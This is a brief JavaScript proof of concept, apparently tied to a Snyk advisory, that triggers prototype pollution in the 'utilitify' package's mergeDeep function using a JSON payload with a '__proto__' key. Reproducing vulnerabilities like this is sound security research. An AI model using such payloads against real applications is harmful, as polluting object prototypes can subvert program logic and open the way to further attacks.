//https://snyk.io/vuln/SNYK-JS-UTILITIFY-559497
 
  const { mergeDeep } = require("utilitify");
  var malicious_payload = '{"__proto__":{"polluted":"yes"}}';

   

  var result = mergeDeep(
    { a: { b: { c: "c", d: "d" } } },
    { a: { b: JSON.parse(malicious_payload) } }
  );
// End of file
